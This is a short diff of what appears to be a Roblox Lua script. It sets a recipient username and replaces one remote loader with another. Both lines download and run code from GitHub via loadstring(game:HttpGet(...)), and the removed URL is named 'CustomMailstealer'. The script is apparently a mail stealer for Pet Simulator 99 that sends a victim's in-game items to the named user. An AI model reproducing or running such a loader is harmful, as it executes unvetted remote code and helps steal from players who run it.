@@ -1,5 +1,2 @@
 Username = "oYuceTurkler"
-G_LoadingScreen = "Brutal Scripts"
-G_Mailmessage = "aaa"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriCustom/main/CustomMailstealer"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/PS99Mail/main/Mementomori"))()
